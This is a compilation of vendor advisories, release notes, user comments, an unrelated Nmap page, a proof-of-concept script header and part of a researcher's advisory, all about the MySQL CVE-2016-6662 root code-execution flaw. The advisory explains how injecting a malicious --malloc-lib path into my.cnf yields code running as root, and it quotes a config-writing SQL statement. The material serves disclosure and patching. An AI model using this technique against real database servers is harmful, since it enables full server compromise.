MySQL is a popular multi-threaded, multi-user SQL server. MariaDB is an
enhanced, drop-in replacement for MySQL.

### Description

Multiple vulnerabilities have been discovered in MariaDB and MySQL.
Please review the CVE identifiers referenced below for details.

### Impact

Attackers could execute arbitrary code, escalate privileges, and impact
availability via unspecified vectors.

### Workaround

There is no known workaround at this time.

### Resolution

All MariaDB users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=dev-db/mariadb-10.0.28"

```

All MySQL users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=dev-db/mysql-5.6.34"

```

# Percona Server 5.5.51-38.1 is now available

August 19, 2016

[Hrvoje Matijakovic](https://www.percona.com/blog/author/hrvojem)

![percona server 5.5.51-38.1](data:image/svg+xml...)*Percona*announces the release of *[Percona Server](https://www.percona.com/software/percona-server)* 5.5.51-38.1 on August 19, 2016. Based on [MySQL 5.5.51](http://dev.mysql.com/doc/relnotes/mysql/5.5/en/news-5-5-51.html), including all the bug fixes in it, *Percona Server* 5.5.51-38.1 is now the current stable release in the 5.5 series.

*Percona Server* is open-source and free. You can find release details of the release in the [5.5.51-38.1 milestone](https://launchpad.net/percona-server/%2Bmilestone/5.5.51-38.1) on Launchpad. Downloads are available [here](https://www.percona.com/downloads/Percona-Server-5.5/) and from the [Percona Software Repositories](https://www.percona.com/doc/percona-server/5.5/installation.html#installing-from-binaries).

###### Bugs Fixed:

* [PAM Authentication Plugin](https://www.percona.com/doc/percona-server/5.5/management/pam_plugin.html) would abort authentication while checking UNIX user group membership if there were more than a thousand members. Bug fixed [#1608902](https://bugs.launchpad.net/percona-server/%2Bbug/1608902).
* [PAM Authentication Plugin](https://www.percona.com/doc/percona-server/5.5/management/pam_plugin.html) didn’t support spaces in the UNIX user group names. Bug fixed [#1544443](https://bugs.launchpad.net/percona-server/%2Bbug/1544443).
* If `DROP DATABASE` would fail to delete some of the tables in the database, the partially-executed command is logged in the binlog as `DROP TABLE t1, t2, ...` for the tables for which drop succeeded. A slave might fail to replicate such DROP TABLE statement if there exist foreign key relationships to any of the dropped tables and the slave has a different schema from the master. Fixed by checking, on the master, whether any of the database to be dropped tables participate in a Foreign Key relationship, and fail the `DROP DATABASE` statement immediately. Bug fixed [#1525407](https://bugs.launchpad.net/percona-server/%2Bbug/1525407) (upstream [#79610](http://bugs.mysql.com/bug.php?id=79610)).
* *Percona Server* 5.5 could not be built with the `-DMYSQL_MAINTAINER_MODE=ON` option. Bug fixed [#1590454](https://bugs.launchpad.net/percona-server/%2Bbug/1590454).
* In the client library, any `EINTR` received during network I/O was not handled correctly. Bug fixed [#1591202](https://bugs.launchpad.net/percona-server/%2Bbug/1591202) (upstream [#82019](http://bugs.mysql.com/bug.php?id=82019)).
* The included `.gitignore` in the percona-server source distribution had a line `*.spec`, which means someone trying to check in a copy of the percona-server source would be missing the spec file required to build the RPM packages. Bug fixed [#1600051](https://bugs.launchpad.net/percona-server/%2Bbug/1600051).
* The fix for bug [#1341067](https://bugs.launchpad.net/percona-server/%2Bbug/1341067) added a call to free some of the heap memory allocated by OpenSSL. This was not safe for repeated calls if OpenSSL is linked twice through different libraries and each is trying to free the same. Bug fixed [#1604676](https://bugs.launchpad.net/percona-server/%2Bbug/1604676).
* If the changed page bitmap redo log tracking thread stops due to any reason, then shutdown will wait for a long time for the log tracker thread to quit, which it never does. Bug fixed [#1606821](https://bugs.launchpad.net/percona-server/%2Bbug/1606821).
* Performing slow InnoDB shutdown (`innodb_fast_shutdown` set to `0`) could result in an incomplete purge, if a separate purge thread is running (which is a default in *Percona Server*). Bug fixed [#1609364](https://bugs.launchpad.net/percona-server/%2Bbug/1609364).
* Due to security reasons `ld_preload` libraries can now only be loaded from the system directories (`/usr/lib64`, `/usr/lib`) and the *MySQL* installation base directory.

###### Other bugs fixed:

This new release instantly refused to start with malloc-lib set to jemalloc, while the previous versions worked as expected. What changed? No errors were being logged, and the log file itself wasn’t even being opened. This caused us an extended service outage which could have been avoided.

Hi,

For security reasons ld\_preload libraries can now only be loaded from system directories. It looks like this change was omitted from the change log and this announcement.

 0  ![Andrei ZeeGiant](data:image/svg+xml...) Andrei ZeeGiant    8 years ago

Hello,

Thanks for the update! When you say system directories, are there any in particular? For example jemalloc was being loaded using:

malloc-lib=’/usr/local/lib/libjemalloc.so’

However, this technically is a “system directory”.

 0  ![Andrei ZeeGiant](data:image/svg+xml...) Andrei ZeeGiant    8 years ago

To answer my own question. The only dirs which work to ld\_preload are:

/usr/lib
 /usr/lib64

I also want to mention that symlinks pointing outside of these lib dirs can be used as it doesn’t seem they’re being dereferenced. For example, I now have malloc-lib=’/usr/lib64/libjemalloc.so’, where /usr/lib64/libjemalloc.so is a symlink to /usr/local/lib/libjemalloc.so, which is also a symlink to /usr/local/lib/libjemalloc.so.2. The MySQL service however, clearly shows it loaded:

mysqld 12853 mysql mem REG 9,0 292817 3530336 /usr/local/lib/libjemalloc.so.2

However, I would expect the following to all work if used, and not just the two /usr/lib’s from above:

/usr/local/lib
 /usr/local/lib64
 /lib
 /lib64

Thanks for reporting this, I’ll need to check the suggestion about adding the /usr/local/ as the original recommendation came from our security team.

## Topic

An update for rh-mysql56-mysql is now available for Red Hat Software Collections.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

MySQL is a multi-user, multi-threaded SQL database server. It consists of the MySQL server daemon, mysqld, and many client programs.

The following packages have been upgraded to a newer upstream version: rh-mysql56-mysql (5.6.34).

Security Fix(es):

* It was discovered that the MySQL logging functionality allowed writing to MySQL configuration files. An administrative database user, or a database user with FILE privileges, could possibly use this flaw to run arbitrary commands with root privileges on the system running the database server. (CVE-2016-6662)
* A race condition was found in the way MySQL performed MyISAM engine table repair. A database user with shell access to the server running mysqld could use this flaw to change permissions of arbitrary files writable by the mysql system user. (CVE-2016-6663, CVE-2016-5616)
* A flaw was found in the way the mysqld\_safe script handled creation of error log file. The mysql operating system user could use this flaw to escalate their privileges to root. (CVE-2016-6664, CVE-2016-5617)
* This update fixes several vulnerabilities in the MySQL database server. Information about these flaws can be found on the Oracle Critical Patch Update Advisory pages, listed in the References section. (CVE-2016-3492, CVE-2016-5507, CVE-2016-5626, CVE-2016-5629, CVE-2016-8283)

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

After installing this update, the MySQL server daemon (mysqld) will be restarted automatically.

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

# MySQL / MariaDB / Percona - Remote Root Code Execution / PrivEsc PoC Exploit
# (CVE-2016-6662)
# 0ldSQL\_MySQL\_RCE\_exploit.py (ver. 1.0)
#
# For testing purposes only. Do no harm.
#
# Discovered/Coded by:
#
# Dawid Golunski
# http://legalhackers.com
#
#
# This is a limited version of the PoC exploit. It only allows appending to
# existing mysql config files with weak permissions. See V) 1) section of
# the advisory for details on this vector.
#
# Full PoC will be released at a later date, and will show how attackers could
# exploit the vulnerability on default installations of MySQL on systems with no
# writable my.cnf config files available.
#
# The upcoming advisory CVE-2016-6663 will also make the exploitation trivial
# for certain low-privileged attackers that do not have FILE privilege.
#
# See full advisory for details:

[Changelog](/kb/en/mariadb-5551-changelog/)
[Overview of 5.5](/kb/en/what-is-mariadb-55/)

**Release date:** 10 Aug 2016

This is a ***[Stable](/kb/en/release-criteria/) (GA)*** release.

**For a description of [MariaDB 5.5](/kb/en/what-is-mariadb-55/) see the
[What is MariaDB 5.5?](/kb/en/what-is-mariadb-55/) page.**

In most respects [MariaDB](/kb/en/mariadb/) will work exactly as MySQL: all commands,
interfaces, libraries and APIs that exist in MySQL also exist in MariaDB.

## Updates & Bug Fixes

[MariaDB 5.5.51](/kb/en/mariadb-5551-release-notes/) is a maintenance release. It includes several bugfixes and
updates, including from MySQL 5.5.51. Notable changes include:

* [XtraDB](/kb/en/xtradb/) updated to 5.5.50-38.0

* Fixes for the following [security vulnerabilities](/kb/en/cve/):
  + [CVE-2016-6662](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6662) ([MDEV-10465](https://jira.mariadb.org/browse/MDEV-10465)). That allowed a malicious user to create a `my.cnf` in the datadir and, under certain circumstances, execute arbitrary code as mysql (or even root) user. This vulnerability was discovered by [Dawid Golunski](http://legalhackers.com).
  + [CVE-2016-5612](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5612)

## Changelog

A full list of all changes is in the [changelog](/kb/en/mariadb-5551-changelog/).

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2016%3A2059)

## Topic

An update for mariadb-galera is now available for Red Hat Enterprise Linux OpenStack Platform 5.0 (Icehouse) for RHEL 7.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

MariaDB is a multi-user, multi-threaded SQL database server that is binary compatible with MySQL. Galera is a synchronous multi-master cluster for MariaDB.

Security Fix(es):

* It was discovered that the MySQL logging functionality allowed writing to MySQL configuration files. An administrative database user, or a database user with FILE privileges, could possibly use this flaw to run arbitrary commands with root privileges on the system running the database server. (CVE-2016-6662)

Bug Fix(es):

* Because Red Hat Enterprise Linux 7.3 changed the return format of the "systemctl is-enabled" command as consumed by shell scripts, the mariadb-galera RPM package, upon installation, erroneously detected that the MariaDB service was enabled when it was not. As a result, the Red Hat OpenStack Platform installer, which then tried to run mariadb-galera using Pacemaker and not systemd, failed to start Galera. With this update, mariadb-galera's RPM installation scripts now use a different systemctl command, correctly detecting the default MariaDB as disabled, and the installer can succeed. (BZ#1376908)
* Previously, both the mariadb-server and mariadb-galera-server packages shipped the client-facing libraries, dialog.so and mysql\_clear\_password.so. As a result, the mariadb-galera-server package would fail to install because of package conflicts. With this update, these libraries have been moved from mariadb-galera-server to mariadb-libs, and the mariadb-galera-server package installs successfully. (BZ#1376902)

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

After installing this update, the MariaDB server daemon (mysqld) will be restarted automatically.

## Affected Products

* Red Hat OpenStack 5.0 for RHEL 7 x86\_64

## Fixes

* [BZ - 1375198](https://bugzilla.redhat.com/show_bug.cgi?id=1375198)
  - CVE-2016-6662 mysql: general\_log can write to configuration files, leading to privilege escalation
* [BZ - 1376902](https://bugzilla.redhat.com/show_bug.cgi?id=1376902)
  - RHEL 7.3 upgrades fails on upgrade because of mariadb-libs package conflict.
* [BZ - 1376908](https://bugzilla.redhat.com/show_bug.cgi?id=1376908)
  - mysqld service prevents haproxy to get started and deployment fails

## CVEs

[Overview of 10.1](/kb/en/what-is-mariadb-101/)

**Release date:** 30 Aug 2016

[MariaDB 10.1](/kb/en/what-is-mariadb-101/) is the current stable series of MariaDB. It is an evolution
of [MariaDB 10.0](/kb/en/what-is-mariadb-100/) with several entirely new features not found anywhere else
and with backported and reimplemented features from MySQL 5.6 and 5.7.

[MariaDB 10.1.17](/kb/en/mariadb-10117-release-notes/) is a ***[Stable (GA)](/kb/en/release-criteria/)*** release.

**For an overview of [MariaDB 10.1](/kb/en/what-is-mariadb-101/) see the
[What is MariaDB 10.1?](/kb/en/what-is-mariadb-101/) page.**

Thanks, and enjoy MariaDB!

## Notable Changes

* [XtraDB](/kb/en/xtradb/) updated to 5.6.31-77.0
* [TokuDB](/kb/en/tokudb/) updated to 5.6.31-77.0
* [Innodb](/kb/en/innodb/) updated to 5.6.32
* [Performance Schema](/kb/en/performance-schema/) updated to 5.6.32
* The CONNECT engine now supports the [JDBC Table type](/kb/en/connect-jdbc-table-type-accessing-tables-from-other-dbms/) - [MDEV-9765](https://jira.mariadb.org/browse/MDEV-9765).
* As per the [MariaDB Deprecation Policy](/kb/en/deprecation-policy/), this will be the last release of [MariaDB 10.1](/kb/en/what-is-mariadb-101/) for Fedora 22
* Packages for Fedora 24 are [now available](https://downloads.mariadb.org/mariadb/repositories/)

* Fixes for the following [security vulnerabilities](/kb/en/cve/):
  + [CVE-2016-6662](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6662) ([MDEV-10465](https://jira.mariadb.org/browse/MDEV-10465)). That allowed a malicious user to create a `my.cnf` in the datadir and, under certain circumstances, execute arbitrary code as mysql (or even root) user. This vulnerability was discovered by [Dawid Golunski](http://legalhackers.com).

### Galera Updates

* Galera wsrep library updated to 25.3.17
* The support for [wsrep\_max\_ws\_rows](/kb/en/galera-cluster-system-variables/#wsrep_max_ws_rows) system variable has now been added and thus its values will no longer be ignored by the server. In order to be backward compatible its default value has been changed to **0** (from 131072), which essentially allows writesets of any size.
* The default value of [wsrep\_max\_ws\_size](/kb/en/galera-cluster-system-variables/#wsrep_max_ws_size) has been raised from 1GB to 2GB.

# Percona Server Critical Update CVE-2016-6662

[From seclist.org](http://seclists.org/oss-sec/2016/q3/481):

An independent research has revealed multiple severe MySQL vulnerabilities. This advisory focuses on a critical vulnerability with a CVEID of CVE-2016-6662. The vulnerability affects MySQL servers in all version branches (5.7, 5.6, and 5.5) including the latest versions, and could be exploited by both local and remote attackers.

Both the authenticated access to MySQL database (via network connection or web interfaces such as phpMyAdmin) and SQL Injection could be used as exploitation vectors. Successful exploitation could allow attackers to execute arbitrary code with root privileges which would then allow them to fully compromise the server on which an affected version of MySQL is running.

This is a **CRITICAL** update, and the fix mitigates the potential for **remote root code execution**.

We encourage our users to update to the latest version of their particular fork as soon as possible, ensuring they have appropriate change management procedures in place beforehand so they can test the update before placing it into production.

Percona would like to thank Dawid Golunski of <http://legalhackers.com/> for disclosing this vulnerability in the MySQL software, and working with us to resolve this problem.

What about the Percona-XtraDB-Cluster package?

Ah So I’m not the only one. I thought I had caching issues somewhere or something. But it seems XtraDB has not been patched yet.

This should be pattched in 5.5.41-25.11.1 onward for PXC (<https://www.percona.com/blog/2016/09/22/percona-xtradb-cluster-5-5-41-25-11-1-is-now-available/>)

Just curious if Percona XtraDB Cluster is also affected… And when to expect patches, if yes.

@Remco
 As confirmed by percona in mail to users, For that release will come next week.

What about those who were already on percona 5.7.14 7 before this Announcement .Was earlier Binary already patched or need to re download latest binaries.

 0  ![Mike Waddle](data:image/svg+xml...) Mike Waddle    8 years ago

We ran into memory issues after going from 5.6.23 to this patch. Suspect a memory leak.

 0   ![scaarup](data:image/svg+xml...) scaarup    Reply to   [Mike Waddle](#comment-10967015)   8 years ago

How did you identify this? Is this potential bug tracked elsewhere?

It appears that we ran into a memory leak as well.

 0  ![krushik](data:image/svg+xml...) krushik    Reply to   [Mike Waddle](#comment-10967015)   8 years ago

Yep. I already narrowed it to this 5.6.32-78.0 update. There is no such memory leak in 5.6.31-77.0. Somebody also reported the similar problem for 5.7: <https://www.percona.com/forums/questions-discussions/mysql-and-percona-server/percona-server-5-7/45836-memory-usage-and-swap-usage-percona-server-5-7-mysql-5-7>

Anyone affected by this memory leak – are you using the audit log plugin?

 0  ![ram](data:image/svg+xml...) [ram](https://www.24x7serversupport.com/)    8 years ago

Anybody is using the audit log plugin?

The link for “Percona Server 5.6.32-78.1” is not correct!

## Topic

An update for rh-mariadb101-mariadb is now available for Red Hat Software Collections.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

MariaDB is a multi-user, multi-threaded SQL database server. For all practical purposes, MariaDB is binary-compatible with MySQL.

The following packages have been upgraded to a newer upstream version: rh-mariadb101-mariadb (10.1.19).

Security Fix(es):

* It was discovered that the MariaDB logging functionality allowed writing to MariaDB configuration files. An administrative database user, or a database user with FILE privileges, could possibly use this flaw to run arbitrary commands with root privileges on the system running the database server. (CVE-2016-6662)
* A race condition was found in the way MariaDB performed MyISAM engine table repair. A database user with shell access to the server running mysqld could use this flaw to change permissions of arbitrary files writable by the mysql system user. (CVE-2016-6663, CVE-2016-5616)
* This update fixes several vulnerabilities in the MariaDB database server. Information about these flaws can be found on the Oracle Critical Patch Update Advisory page, listed in the References section. (CVE-2016-3492, CVE-2016-5624, CVE-2016-5626, CVE-2016-5629, CVE-2016-8283)

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

After installing this update, the MariaDB server daemon (mysqld) will be restarted automatically.

Debian Security Advisory DSA-3666-1                   security@debian.org
<https://www.debian.org/security/>                     Salvatore Bonaccorso

Package        : mysql-5.5
CVE ID         : CVE-2016-6662

Dawid Golunski discovered that the mysqld_safe wrapper provided by the
MySQL database server insufficiently restricted the load path for custom
malloc implementations, which could result in privilege escalation.

The vulnerability was addressed by upgrading MySQL to the new upstream
version 5.5.52, which includes additional changes, such as performance
improvements, bug fixes, new features, and possibly incompatible
changes. Please see the MySQL 5.5 Release Notes for further details:

 <https://dev.mysql.com/doc/relnotes/mysql/5.5/en/news-5-5-51.html>
 <https://dev.mysql.com/doc/relnotes/mysql/5.5/en/news-5-5-52.html>

For the stable distribution (jessie), this problem has been fixed in
version 5.5.52-0+deb8u1.

We recommend that you upgrade your mysql-5.5 packages.

## Topic

An update for rh-mariadb100-mariadb is now available for Red Hat Software Collections.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

MariaDB is a multi-user, multi-threaded SQL database server. For all practical purposes, MariaDB is binary-compatible with MySQL.

The following packages have been upgraded to a newer upstream version: rh-mariadb100-mariadb (10.0.28).

Security Fix(es):

* It was discovered that the MariaDB logging functionality allowed writing to MariaDB configuration files. An administrative database user, or a database user with FILE privileges, could possibly use this flaw to run arbitrary commands with root privileges on the system running the database server. (CVE-2016-6662)
* A race condition was found in the way MariaDB performed MyISAM engine table repair. A database user with shell access to the server running mysqld could use this flaw to change permissions of arbitrary files writable by the mysql system user. (CVE-2016-6663, CVE-2016-5616)
* This update fixes several vulnerabilities in the MariaDB database server. Information about these flaws can be found on the Oracle Critical Patch Update Advisory page, listed in the References section. (CVE-2016-3492, CVE-2016-5612, CVE-2016-5624, CVE-2016-5626, CVE-2016-5629, CVE-2016-5630, CVE-2016-8283)

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

After installing this update, the MariaDB server daemon (mysqld) will be restarted automatically.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2017%3A0184)

## Topic

An update for mysql is now available for Red Hat Enterprise Linux 6.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

MySQL is a multi-user, multi-threaded SQL database server. It consists of the MySQL server daemon (mysqld) and many client programs and libraries.

Security Fix(es):

* It was discovered that the MySQL logging functionality allowed writing to MySQL configuration files. An administrative database user, or a database user with FILE privileges, could possibly use this flaw to run arbitrary commands with root privileges on the system running the database server. (CVE-2016-6662)
* A race condition was found in the way MySQL performed MyISAM engine table repair. A database user with shell access to the server running mysqld could use this flaw to change permissions of arbitrary files writable by the mysql system user. (CVE-2016-6663, CVE-2016-5616)

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

After installing this update, the MySQL server daemon (mysqld) will be restarted automatically.

```
Vulnerability: MySQL Remote Root Code Execution / Privilege Escalation 0day
CVE: CVE-2016-6662
Severity: Critical
Affected MySQL versions (including the latest):
<= 5.7.15
<= 5.6.33
<= 5.5.52

Discovered by:
Dawid Golunski
<http://legalhackers.com>

An independent research has revealed multiple severe MySQL vulnerabilities.
This advisory focuses on a critical vulnerability with a CVEID of CVE-2016-6662.
The vulnerability affects MySQL servers in all version branches
(5.7, 5.6, and 5.5) including the latest versions, and could be exploited by
both local and remote attackers.
Both the authenticated access to MySQL database (via network
connection or web interfaces such as phpMyAdmin) and SQL Injection
could be used as exploitation vectors.

Successful exploitation could allow attackers to execute arbitrary code with
root privileges which would then allow them to fully compromise the server on
which an affected version of MySQL is running.

This advisory provides a (limited) Proof-Of-Concept MySQL exploit
which demonstrates how Remote Root Code Execution could be achieved by
attackers. Full PoC will be provided later on to give users a chance
to react to this exploit as the issue has not been patched by all the
affected vendors yet despite efforts.

The exploitation is interesting in the way that it involves an
oldschool LD_PRELOAD environment variable and that it targets a
service that doesn't
serve requests as root but could still be tricked to get root RCE when
restarted.
Might give you strange feelings when restarting mysql service the next time ;)

III. INTRODUCTION
-------------------------

An independent research has revealed multiple severe MySQL vulnerabilities.
This advisory focuses on a critical vulnerability with a CVEID of CVE-2016-6662
which can allow attackers to (remotely) inject malicious settings into MySQL
configuration files (my.cnf) leading to critical consequences.

The vulnerability affects all MySQL servers in default configuration in all
version branches (5.7, 5.6, and 5.5) including the latest versions, and could
be exploited by both local and remote attackers.
Both the authenticated access to MySQL database (via network connection or web
interfaces such as phpMyAdmin) and SQL Injection could be used as exploitation
vectors.

As SQL Injection attacks are one of the most common issues in web applications,
the CVE-2016-6662 vulnerabilty could put web applications at a critical risk in
case of a successful SQL Injection attack.

A successful exploitation could allow attackers to execute arbitrary code with
root privileges which would then allow them to fully compromise the server on
which an affected version of MySQL is running.

The vulnerability can be exploited even if security modules SELinux and AppArmor
are installed with default active policies for MySQL service on major Linux
distributions.

This advisory provides a Proof-Of-Concept MySQL exploit which demonstrates how
Remote Root Code Execution could be achieved by attackers.

IV. DESCRIPTION
-------------------------

The default MySQL package comes with a mysqld_safe script which is used by many
default installations/packages of MySQL as a wrapper to start the MySQL service
process which can observed, for example, in case of the following fully-updated
Debian system:

root@debian:~# lsb_release -a
No LSB modules are available.
Distributor ID:	Debian
Description:	Debian GNU/Linux 8.5 (jessie)
Release:	8.5
Codename:	jessie

root@debian:~# dpkg -l | grep -i mysql-server
ii  mysql-server                        5.5.50-0+deb8u1
ii  mysql-server-5.5                    5.5.50-0+deb8u1
ii  mysql-server-core-5.5               5.5.50-0+deb8u1

After starting MySQL (installed from packages provided in the default Debian repositories) by running

root@debian:~# service mysql start

or, alternatively:

root@debian:~# /etc/init.d/mysql start

The MySQL server process tree looks as follows:

root     14967  0.0  0.1   4340  1588 ?        S    06:41   0:00 /bin/sh /usr/bin/mysqld_safe

mysql    15314  1.2  4.7 558160 47736 ?        Sl   06:41   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306

As can be seen, the mysqld_safe wrapper script is executed as root, whereas the
main mysqld process drops its privileges to mysql user.

The wrapper script has the following function :

----[ /usr/bin/mysqld_safe ]----

[...]

# set_malloc_lib LIB
# - If LIB is empty, do nothing and return
# - If LIB is 'tcmalloc', look for tcmalloc shared library in /usr/lib
#   then pkglibdir.  tcmalloc is part of the Google perftools project.
# - If LIB is an absolute path, assume it is a malloc shared library
#
# Put LIB in mysqld_ld_preload, which will be added to LD_PRELOAD when
# running mysqld.  See ld.so for details.
set_malloc_lib() {
  malloc_lib="$1"

  if [ "$malloc_lib" = tcmalloc ]; then
    pkglibdir=`get_mysql_config --variable=pkglibdir`
    malloc_lib=
    # This list is kept intentionally simple.  Simply set --malloc-lib
    # to a full path if another location is desired.
    for libdir in /usr/lib "$pkglibdir" "$pkglibdir/mysql"; do
      for flavor in _minimal '' _and_profiler _debug; do
        tmp="$libdir/libtcmalloc$flavor.so"
        #log_notice "DEBUG: Checking for malloc lib '$tmp'"
        [ -r "$tmp" ] || continue
        malloc_lib="$tmp"
        break 2
      done
    done

[...]

----------[ eof ]---------------

which can be used to preload a shared library before starting the server.

The library can be set with the following parameter:

--malloc-lib=LIB

This parameter can also be specified within a mysql config file (my.cnf)
in a '[mysqld]' or '[mysqld_safe]' section.

If an attacker managed to inject a path to their malicious library within the
config, they would be able to preload an arbitrary library and thus execute
arbitrary code with root privileges when MySQL service is restarted.
The restart could be triggered manually, via a system update, package update
(including an update of dependencies), system reboot etc.).
Attackers might also be able to speed up the server restart remotely by issuing
a SHUTDOWN SQL statement or 'shutdown' command via mysqladmin.

In 2003 a vulnerability was disclosed in MySQL versions before 3.23.55 that
allowed users to create mysql config files with a simple statement:

SELECT * INTO OUTFILE '/var/lib/mysql/my.cnf'

The issue was fixed by refusing to load config files with world-writable
permissions as these are the default permissions applied to files created
by OUTFILE query.
As an additional protection, OUTFILE/DUMPFILE statements are prohibited from
overwrite existing files.
This protects existing configuration files.
The old vulnerability has been considered fixed ever since the MySQL 3.23.55
was released in 2003, and writing to configuration files has been considered
impossible.

However, the V. PROOF OF CONCEPT section below will show that it is possible to
successfully bypass current restrictions by abusing MySQL logging functions
(available in every MySQL install by default) to achieve the following:

1) Inject malicious configuration into existing MySQL configuration files on
systems with weak/improper permissions (configs owned by/writable by mysql user)
(SCENARIO 1).

2) Create new configuration files within a MySQL data directory (writable
by MySQL by default) on _default_ MySQL installs without the need to rely on
improper config permissions (SCENARIO 2).

3) Attackers with only SELECT/FILE permissions can gain access to logging
functions (normally only available to MySQL admin users) on all of the
_default_ MySQL installations and thus be in position to add/modify MySQL
config files.

Update (16/09/2016):
The proof of concept details below should be read closely as there have been
some misconceptions noticed on some security forums which incorrectly try
to lessen the severity of this vulnerability due to a lack of correct
understanding of the issues presented in this advisory.
It should be noted that:

